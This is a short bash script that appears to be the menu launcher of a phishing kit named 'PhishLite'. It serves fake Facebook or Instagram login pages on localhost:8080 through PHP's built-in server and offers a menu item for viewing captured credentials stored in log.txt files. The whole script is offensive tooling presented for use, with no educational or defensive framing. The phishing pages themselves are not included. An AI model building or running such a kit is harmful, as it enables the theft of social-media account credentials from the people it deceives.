#!/bin/bash

clear
# Display banner
if [ -f banner.txt ]; then
  cat banner.txt
else
  echo "Welcome to PhishLite"
fi

echo ""
echo "1. Facebook"
echo "2. Instagram"
echo "3. View Captured Credentials"
echo "4. Exit"
echo ""
read -p "Choose an option: " choice


case $choice in
  1)
    cd facebook 2>/dev/null || { echo "Facebook folder not found!"; exit 1; }
    echo "[+] Starting Facebook phishing page on http://localhost:8080"
    php -S localhost:8080
    ;;
  2)
    cd instagram 2>/dev/null || { echo "Instagram folder not found!"; exit 1; }
    echo "[+] Starting Instagram phishing page on http://localhost:8080"
    php -S localhost:8080
    ;;
  3)
    echo ""
    echo "===== Facebook Credentials ====="
    if [ -f facebook/log.txt ]; then
      cat facebook/log.txt
    else
      echo "No Facebook logs found."
    fi

    echo ""
    echo "===== Instagram Credentials ====="
    if [ -f instagram/log.txt ]; then
      cat instagram/log.txt
    else
      echo "No Instagram logs found."
    fi
    ;;
  4)
    echo "Exiting PhishLite. Bye!"
    exit 0
    ;;
  *)
    echo "Invalid option. Exiting..."
    exit 1
    ;;
esac

